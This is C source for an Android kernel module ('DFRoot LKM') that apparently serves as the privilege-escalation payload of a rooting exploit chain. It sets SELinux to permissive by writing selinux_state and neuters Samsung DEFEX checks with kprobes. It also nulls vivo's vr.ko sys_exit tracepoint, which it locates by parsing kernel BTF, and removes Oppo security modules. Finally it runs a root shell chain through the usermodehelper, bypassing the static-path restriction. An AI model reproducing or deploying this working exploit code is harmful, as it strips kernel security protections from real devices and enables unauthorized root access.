#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/ptrace.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("DFRoot LKM");

/* W1c: disarm vivo's vr.ko sys_exit tracepoint probe. exp.c scans the module
 * image for DF_VR_MAGIC right before writing it into the page cache and
 * patches df_vr_cfg[1] with the funcs offset inside struct tracepoint
 * (device-specific, parsed from GhostLock / kernel image). Offset 0 = the
 * stage is off and the probe is left alone. volatile: written externally.
 * cfg[2] = auto mode: the offset is resolved at runtime here in ring 0 by
 * parsing /sys/kernel/btf/vmlinux (the kernel's own type info - the only
 * trustworthy per-device source; vivo's vr.ko unlink-hides itself so
 * module-list-based checks are useless, and mainline-derived constants are
 * wrong: vivo adds a probestub member, shifting funcs from 0x40 to 0x48).
 * On resolution failure the stage REFUSES to write, aborts the root chain
 * (bootstrap binary renamed away) and reports via /dev/dfvrx - a blind
 * write against a guessed member would corrupt the tracepoint. */
#define DF_VR_MAGIC 0xDFC0FF16DFC0FF16ULL
volatile unsigned long df_vr_cfg[3] = { DF_VR_MAGIC, 0, 0 };

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
                             void *init, void *cleanup, void *data);
typedef int (*umh_exec_t)(void *info, int wait);
typedef int  (*kern_path_t)(const char *, unsigned int, struct path *);
typedef int  (*invalidate_t)(struct address_space *);
typedef void (*path_put_t)(const struct path *);

/* BTF resolver helpers. Prototypes MUST textually match the real kernel
 * signatures - the ko calls them through kallsyms pointers and the kernel's
 * kCFI hashes the whole function type (a mismatched return type = BRK
 * panic, same reason kallsyms_lookup_name_t looks the way it does). */
struct file;
typedef struct file   *(*filp_open_t)(const char *, int, umode_t);
typedef ssize_t        (*kernel_read_t)(struct file *, void *, size_t, loff_t *);
typedef int            (*filp_close_t)(struct file *, void *);
typedef void          *(*vzalloc_t)(unsigned long);
typedef void           (*vfree_t)(const void *);

static struct kprobe defex_enforce_kp;
static struct kprobe defex_umh_kp;
static int defex_enforce_ok;
static int defex_umh_ok;

static int null_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
    (void)p;
    regs->regs[0] = 0;         /* x0 = DEFEX_ALLOW */
    regs->pc = regs->regs[30]; /* skip body: return to caller */
    return 1;
}

/* ---- W1c auto-resolve: BTF --------------------------------------------
 * Read /sys/kernel/btf/vmlinux and take offsetof(struct tracepoint, funcs)
 * straight from the running kernel's own type info - authoritative and
 * config-aware (LTO / padding / vendor members all baked in; this is what
 * put funcs at 0x48 on vivo where mainline sits at 0x40). Logic identical
 * to the vrsolve userspace tool verified on-device. Returns the byte
 * offset, or 0 when BTF is unavailable or unusable. */
static unsigned long __nocfi vr_btf_funcs(filp_open_t f_open,
                                          kernel_read_t k_read,
                                          filp_close_t f_close,
                                          vzalloc_t valloc, vfree_t vfree)
{
    struct file *f;
    void *buf;
    loff_t pos = 0;
    ssize_t n;
    unsigned char *b;
    unsigned long types, strtab, tp_end, p;
    unsigned long off = 0;
    const unsigned int BTF_SZ = 8u * 1024 * 1024;

    f = f_open("/sys/kernel/btf/vmlinux", O_RDONLY, 0);
    if (IS_ERR_OR_NULL(f)) {
        pr_info("dfroot: vr auto: BTF not available\n");
        return 0;
    }
    buf = valloc(BTF_SZ);
    if (!buf) {
        f_close(f, NULL);
        return 0;
    }
    /* Loop the read: a single kernel_read on the BTF sysfs attribute
     * short-reads (observed on-device - 6MB file, one call returns less),
     * which the first cut mistook for truncation. 1MB chunks until EOF. */
    {
        size_t total = 0;
        while (total < BTF_SZ) {
            size_t chunk = BTF_SZ - total;
            if (chunk > 1024 * 1024)
                chunk = 1024 * 1024;
            n = k_read(f, buf + total, chunk, &pos);
            if (n <= 0)
                break;
            total += (size_t)n;
        }
        n = (ssize_t)total;
    }
    f_close(f, NULL);
    if (n < 64) {
        pr_warn("dfroot: vr auto: BTF read short (%zd)\n", n);
        vfree(buf);
        return 0;
    }
    b = buf;
    /* struct btf_header: magic u16, version u8, flags u8, hdr_len u32,
     * type_off u32, type_len u32, str_off u32, str_len u32. */
    {
        unsigned short magic = b[0] | ((unsigned short)b[1] << 8);
        unsigned int hdr_len, type_off, type_len, str_off;
        if (magic != 0xeb9f) {
            pr_warn("dfroot: vr auto: BTF magic %04x\n", magic);
            vfree(buf);
            return 0;
        }
        hdr_len  = b[4] | (b[5] << 8) | (b[6] << 16) | ((unsigned int)b[7] << 24);
        type_off = b[8] | (b[9] << 8) | (b[10] << 16) | ((unsigned int)b[11] << 24);
        type_len = b[12] | (b[13] << 8) | (b[14] << 16) | ((unsigned int)b[15] << 24);
        str_off  = b[16] | (b[17] << 8) | (b[18] << 16) | ((unsigned int)b[19] << 24);
        if ((long)hdr_len + type_off + type_len > n) {
            pr_warn("dfroot: vr auto: BTF truncated\n");
            vfree(buf);
            return 0;
        }
        types  = hdr_len + type_off;
        strtab = hdr_len + str_off;
        tp_end = types + type_len;
    }

    /* Walk BTF types to the STRUCT named "tracepoint", then find the
     * member named "funcs". btf_type = {name_off u32, info u32, size/type
     * u32}; struct member = {name_off u32, type u32, offset u32}. */
    p = types;
    while (p + 12 <= tp_end) {
        unsigned int info     = b[p+4] | (b[p+5] << 8) | (b[p+6] << 16) | ((unsigned int)b[p+7] << 24);
        unsigned int kind = (info >> 24) & 0x1f;
        unsigned int vlen = info & 0xffff;
        unsigned long pay;
        if (kind == 4) { /* STRUCT */
            unsigned long j, m = p + 12;
            if (m + (unsigned long)vlen * 12 > tp_end) break;
            for (j = 0; j < vlen; j++, m += 12) {
                unsigned int mn = b[m] | (b[m+1] << 8) | (b[m+2] << 16) | ((unsigned int)b[m+3] << 24);
                unsigned int mo = b[m+8] | (b[m+9] << 8) | (b[m+10] << 16) | ((unsigned int)b[m+11] << 24);
                const char *nm;
                if (strtab + mn >= (unsigned long)n)
                    continue;
                nm = (const char *)b + strtab + mn;
                if (!strcmp(nm, "funcs")) {
                    off = mo / 8;   /* BTF member offsets are in bits */
                    goto out;
                }
            }
        }
        pay = 0;
        switch (kind) {
            case 1: pay = 4; break;              /* INT */
            case 3: pay = 12; break;             /* ARRAY */
            case 4: case 5: pay = (unsigned long)vlen * 12; break; /* STRUCT/UNION */
            case 6: pay = (unsigned long)vlen * 8; break;  /* ENUM */
            case 13: pay = (unsigned long)vlen * 8; break; /* FUNC_PROTO */
            case 14: pay = 8; break;             /* VAR */
            case 15: pay = (unsigned long)vlen * 12; break; /* DATASEC */
            case 17: pay = 8; break;             /* DECL_TAG */
            case 19: pay = (unsigned long)vlen * 12; break; /* ENUM64 */
            default: pay = 0; break;             /* PTR/FWD/typedef quals/FUNC/... */
        }
        p += 12 + pay;
    }
out:
    if (off > 0x100) {
        pr_warn("dfroot: vr auto: implausible BTF funcs offset %lu\n", off);
        off = 0;
    }
    vfree(buf);
    return off;
}

static int __nocfi __init dfroot_init(void)
{
    kallsyms_lookup_name_t get_addr;
    kern_path_t  kern_path_fn;
    invalidate_t invalidate_fn;
    path_put_t   path_put_fn;
    struct path  p;
    umh_setup_t umh_setup;
    umh_exec_t  umh_exec;
    bool *selinux_state;
    struct kprobe kln_kp;
    void *info;
    int ret;
    const char *vr_marker = "";

    // UMH command to run. The three rmmod calls are Oppo/OnePlus only and fail
    // on every other kernel, and `sh -c` returns the exit code of the LAST
    // command - so on a Samsung the whole helper "returned 256" (exit 1), the
    // bootstrap never ran and the run died at the verify stage (issue #5). The
    // trailing `exit 0` is what makes the helper report success everywhere.
    static const char sh[] = "/system/bin/sh";
    static char *envp[] = { "PATH=/system/bin", NULL };
    // W1c result marker gets appended to the helper chain; the app's log
    // poller picks /dev/dfvr0 and /dev/dfvre up like every other /dev/df*
    // node. /dev is tmpfs, so markers never survive a reboot - same lifetime
    // rules as the dfm* markers.
    static char cmd[1024];
    static char *argv[] = { (char *)sh, "-c", cmd, NULL };

    // Symbol finder
    kln_kp = (struct kprobe){ .symbol_name = "kallsyms_lookup_name" };
    if (register_kprobe(&kln_kp) < 0) {
        pr_err("dfroot: kallsyms_lookup_name not found\n");
        return -EINVAL;
    }
    get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
    unregister_kprobe(&kln_kp);

    // Invalidate page_cache for crash_dump64
    // NOTE: this can cause issues if a process is currently executing
    //   crash_dump64. We may want to revert to manual restore patching
    kern_path_fn  = (kern_path_t) get_addr("kern_path");
    invalidate_fn = (invalidate_t)get_addr("invalidate_inode_pages2");
    path_put_fn   = (path_put_t)  get_addr("path_put");
    if (!kern_path_fn || !invalidate_fn || !path_put_fn) {
        pr_err("dfroot: cache drop symbols missing\n");
    } else if (kern_path_fn("/apex/com.android.runtime/bin/crash_dump64",
                            LOOKUP_FOLLOW, &p)) {
        pr_err("dfroot: kern_path failed for crash_dump64\n");
    } else {
        invalidate_fn(p.dentry->d_inode->i_mapping);
        path_put_fn(&p);
        pr_info("dfroot: cleared page cache for crash_dump64\n");
    }

    // Disable SELinux
    selinux_state = (bool *)get_addr("selinux_state");
    if (!selinux_state) {
        pr_err("dfroot: selinux_state not found\n");
        return -EINVAL;
    }
    WRITE_ONCE(*selinux_state, false);
    pr_info("dfroot: selinux_state permissive\n");

    // Samsung
    defex_enforce_kp = (struct kprobe){ .addr = (kprobe_opcode_t *)get_addr("task_defex_enforce"),
                                .pre_handler = null_pre_handler };
    defex_enforce_ok = register_kprobe(&defex_enforce_kp) == 0;
    if (!defex_enforce_ok)
        pr_err("dfroot: task_defex_enforce not in this kernel, skipping\n");
    else
        pr_info("dfroot: task_defex_enforce hooked\n");
    
    defex_umh_kp = (struct kprobe){ .addr = (kprobe_opcode_t *)get_addr("task_defex_user_exec"),
                              .pre_handler = null_pre_handler };
    defex_umh_ok = register_kprobe(&defex_umh_kp) == 0;
    if (!defex_umh_ok)
        pr_err("dfroot: task_defex_user_exec not in this kernel, skipping\n");
    else
        pr_info("dfroot: task_defex_user_exec hooked\n");

    // W1c: zero __tracepoint_sys_exit->funcs so vivo's vr.ko exit probe (which
    // kills tasks with fresh root creds) never fires again. Pure data write -
    // no hooks, no callbacks - same semantics as GhostLock's W1c stage. Runs
    // right before the UMH/bootstrap/ksud chain, i.e. before anything with
    // fresh root creds is spawned (提权 -> Root -> 用Root改 -> 拉起管理器).
    // cfg[2]=1 (auto): the offset comes from the kernel's own BTF - the
    // verified per-device ground truth (vrsolve on-device: 0x48, matching
    // GhostLock conf and the manual runs). Failure = REFUSE + abort the root
    // chain: the bootstrap binary is renamed away so the shellcode execve
    // fails, /dev/dfvrx + files/vr_offset.txt("fail") tell the app, and the
    // manager is never launched (a fresh-root task would be killed by the
    // still-armed probe and wedge the kernel). Never a blind write.
    // cfg[2]=0: cfg[1] is the user-supplied offset - the verified manual
    // path, unchanged.
    if (READ_ONCE(df_vr_cfg[2])) {
        static char vbuf[160];
        static const char ABORT[] =
            " touch /dev/dfvrx;"
            " echo fail > /data/user_de/0/df.root/files/vr_offset.txt 2>/dev/null;"
            " mv /data/user_de/0/df.root/bootstrap"
            " /data/user_de/0/df.root/bootstrap.abort 2>/dev/null;";
        char *tp = (char *)get_addr("__tracepoint_sys_exit");
        filp_open_t f_open;
        kernel_read_t k_read;
        filp_close_t f_close;
        vzalloc_t valloc;
        vfree_t vfree;
        unsigned long off = 0;
        if (!tp) {
            pr_warn("dfroot: vr auto: __tracepoint_sys_exit missing, abort\n");
            vr_marker = ABORT;
            goto vr_done;
        }
        f_open  = (filp_open_t)get_addr("filp_open");
        k_read  = (kernel_read_t)get_addr("kernel_read");
        f_close = (filp_close_t)get_addr("filp_close");
        valloc  = (vzalloc_t)get_addr("vzalloc");
        vfree   = (vfree_t)get_addr("vfree");
        if (!f_open || !k_read || !f_close || !valloc || !vfree) {
            pr_warn("dfroot: vr auto: file/vmem symbols missing, abort\n");
            vr_marker = ABORT;
            goto vr_done;
        }
        off = vr_btf_funcs(f_open, k_read, f_close, valloc, vfree);
        if (!off) {
            pr_warn("dfroot: vr auto: funcs offset unresolved, abort\n");
            vr_marker = ABORT;
            goto vr_done;
        }
        {
            void **funcs_slot = (void **)(tp + off);
            unsigned long cur = (unsigned long)READ_ONCE(*funcs_slot);
            if (cur && !(cur >= 0xffffff8000000000UL && !(cur & 7))) {
                pr_warn("dfroot: vr auto: slot@%lu holds non-pointer %lx, abort\n",
                        off, cur);
                vr_marker = ABORT;
                goto vr_done;
            }
            if (cur) {
                WRITE_ONCE(*funcs_slot, NULL);
                pr_info("dfroot: W1c vr sys_exit probe disarmed (funcs=NULL, off=%lu, btf)\n",
                        off);
            } else {
                pr_info("dfroot: W1c vr sys_exit funcs already NULL (off=%lu, btf)\n", off);
            }
            snprintf(vbuf, sizeof(vbuf),
                     " touch /dev/dfvra;"
                     " echo %lu > /data/user_de/0/df.root/files/vr_offset.txt 2>/dev/null;",
                     off);
            vr_marker = vbuf;
        }
vr_done:;
    } else if (READ_ONCE(df_vr_cfg[1])) {
        char *tp = (char *)get_addr("__tracepoint_sys_exit");
        if (!tp) {
            pr_warn("dfroot: W1c __tracepoint_sys_exit missing, vr intact\n");
            vr_marker = " touch /dev/dfvre;"
                        " mv /data/user_de/0/df.root/bootstrap"
                        " /data/user_de/0/df.root/bootstrap.abort 2>/dev/null;";
        } else {
            void **funcs_slot = (void **)(tp + READ_ONCE(df_vr_cfg[1]));
            if (READ_ONCE(*funcs_slot)) {
                WRITE_ONCE(*funcs_slot, NULL);
                pr_info("dfroot: W1c vr sys_exit probe disarmed (funcs=NULL, off=%lu)\n",
                        READ_ONCE(df_vr_cfg[1]));
            } else {
                pr_info("dfroot: W1c vr sys_exit funcs already NULL\n");
            }
            vr_marker = " touch /dev/dfvr0;";
        }
    }

    // Run UMH command
    /* Black-box snapshots: this shell runs as root with SELinux already
     * permissive, right after the ko's own pr_info lines - so dmesg1.txt
     * carries the kernel-side ground truth (selinux flip, defex hooks, W1c,
     * umh ret) and lsmod1.txt pins down whether vr.ko is even present on
     * this boot. Both survive a later panic; pstore does not on this ROM. */
    snprintf(cmd, sizeof(cmd),
        "touch /dev/dfm0;"
        " mkdir -p /data/media/0/Download/DirtyFrag;"
        " dmesg > /data/user_de/0/df.root/files/dmesg1.txt 2>&1;"
        " cp /data/user_de/0/df.root/files/dmesg1.txt /data/media/0/Download/DirtyFrag/ 2>/dev/null;"
        " lsmod > /data/user_de/0/df.root/files/lsmod1.txt 2>&1;"
        " cp /data/user_de/0/df.root/files/lsmod1.txt /data/media/0/Download/DirtyFrag/ 2>/dev/null;"
        " /data/user_de/0/df.root/kmsglog &"
        " rmmod oplus_secure_harden 2>/dev/null;"           //
        " rmmod oplus_security_keventupload 2>/dev/null;"   // Oppo/OnePlus
        " rmmod oplus_security_guard 2>/dev/null;"          //
        "%s"
        " exit 0",
        vr_marker);
    umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
    umh_exec  = (umh_exec_t)get_addr("call_usermodehelper_exec");
    if (!umh_setup || !umh_exec) {
        pr_err("dfroot: usermodehelper symbols missing (setup=%px exec=%px)\n",
               umh_setup, umh_exec);
        return 0;
    }

    info = umh_setup(sh, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!info) {
        pr_err("dfroot: usermodehelper_setup: returned NULL\n");
        return 0;
    }
    // bypass CONFIG_STATIC_USERMODEHELPER_PATH="" overriding path to ""
    ((struct subprocess_info *)info)->path = sh;

    ret = umh_exec(info, UMH_WAIT_PROC);
    pr_info("dfroot: usermodehelper_exec returned %d\n", ret);
    
    return 0;
}

static void __exit dfroot_exit(void)
{
    if (defex_enforce_ok) unregister_kprobe(&defex_enforce_kp);
    if (defex_umh_ok)     unregister_kprobe(&defex_umh_kp);
}

module_init(dfroot_init);
module_exit(dfroot_exit);
